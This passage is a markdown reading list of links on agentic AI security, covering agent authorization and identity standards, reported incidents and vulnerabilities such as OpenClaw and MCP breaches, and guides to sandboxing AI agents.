- [HashiCorp: The Confused Deputy Problem in Agentic AI](https://www.hashicorp.com/en/blog/before-you-build-agentic-ai-understand-the-confused-deputy-problem)

### Authorization & Identity
- [IETF draft-oauth-ai-agents-on-behalf-of-user](https://datatracker.ietf.org/doc/draft-oauth-ai-agents-on-behalf-of-user/)
- [AAuth — Agentic Authorization (IETF)](https://datatracker.ietf.org/doc/html/draft-rosenberg-oauth-aauth-00)
- [Auth0: Access Control in the Era of AI Agents](https://auth0.com/blog/access-control-in-the-era-of-ai-agents/)
- [Keyfactor: PKI-Based Identity for Agentic AI](https://www.keyfactor.com/blog/3-things-to-know-about-keyfactors-pki-based-identity-for-agentic-ai/)

### OpenClaw & Security Incidents
- [OpenClaw Security Crisis (Dark Reading)](https://www.darkreading.com/application-security/critical-openclaw-vulnerability-ai-agent-risks)
- [ClawJacked Vulnerability (The Hacker News)](https://thehackernews.com/2026/02/clawjacked-flaw-lets-malicious-sites.html)
- [MCP Security Incidents Timeline (AuthZed)](https://authzed.com/blog/timeline-mcp-breaches)
- [LangGrinch CVE-2025-68664](https://thehackernews.com/2025/12/critical-langchain-core-vulnerability.html)

### Sandboxing
- [How to Sandbox AI Agents in 2026 (Northflank)](https://northflank.com/blog/how-to-sandbox-ai-agents)
- [OWASP AI Agent Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/AI_Agent_Security_Cheat_Sheet.html)
- [Edera: Securing Agentic AI with Hardened Runtime Isolation](https://edera.dev/stories/securing-agentic-ai-systems-with-hardened-runtime-isolation)
- [NVIDIA: Sandboxing Agentic Workflows](https://developer.nvidia.com/blog/practical-security-guidance-for-sandboxing-agentic-workflows-and-managing-execution-risk/)
